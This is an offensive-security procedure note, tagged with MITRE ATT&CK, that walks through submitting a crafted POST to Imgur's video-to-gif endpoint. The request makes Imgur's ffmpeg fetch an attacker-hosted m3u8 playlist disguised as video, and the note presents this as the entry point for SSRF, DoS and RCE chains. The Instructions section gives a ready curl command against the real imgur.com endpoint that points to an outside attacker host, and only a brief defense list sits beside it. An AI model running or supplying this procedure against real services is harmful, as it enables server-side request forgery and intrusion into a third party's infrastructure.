---
tags:
  - ssrf
  - imgur
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.601Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 4870f026-bd81-4d71-a760-166e7b97315a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Prepare-Imgur-Video-Upload-Request

## Summary

This procedure prepares and submits a POST request to Imgur's video-to-gif conversion endpoint, tricking the service into fetching and processing a user-controlled URL containing a malicious m3u8 playlist disguised as a video file.

## Description

Imgur's endpoint at https://imgur.com/vidgif/upload accepts parameters like source, url, start, and stop for video processing. By setting the url to an attacker-controlled PHP script serving m3u8 content with video/avi content-type, ffmpeg on Imgur's server parses the playlist and makes unintended requests. This is the entry point for SSRF, enumeration, DoS, and RCE chains. Prerequisites include a public web server to host the malicious payload.

## Requirements

1. Publicly accessible web server (e.g., hosting PHP at gradeco.ru)
2. Ability to craft HTTP POST requests (via curl, browser form, or script)
3. Knowledge of Imgur's endpoint parameters

## Defense

Defensive measures and detection strategies:

- Validate and sanitize user-supplied URLs, restrict to whitelisted domains
- Implement content-type verification beyond headers, scan for m3u8 signatures
- Monitor ffmpeg processes for anomalous network activity or hangs

## Objectives

1. Trigger Imgur to fetch attacker-controlled content
2. Bypass initial content-type checks
3. Set up for downstream exploits like SSRF

## Instructions

### Step 1: Create POST Form or Curl Request

**Context**: Prepare the request payload pointing to the malicious URL.

**Command** (using curl for submission):
```bash
curl -X POST https://imgur.com/vidgif/upload -d "source=http://gradeco.ru/imgur/m3u8.php&url=http://gradeco.ru/imgur/m3u8.php&start=0.1&stop=1.0"
```

> This submits the form data to Imgur, causing it to download and process the URL with ffmpeg. Expected output is a success response from Imgur if the request is accepted.

### Step 2: Verify Request Acceptance

**Context**: Check Imgur's response to ensure processing begins.

No specific command; inspect HTTP response for 200 OK or processing acknowledgment.

> Successful execution shows no rejection, indicating ffmpeg will parse the m3u8.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- ssrf
- imgur
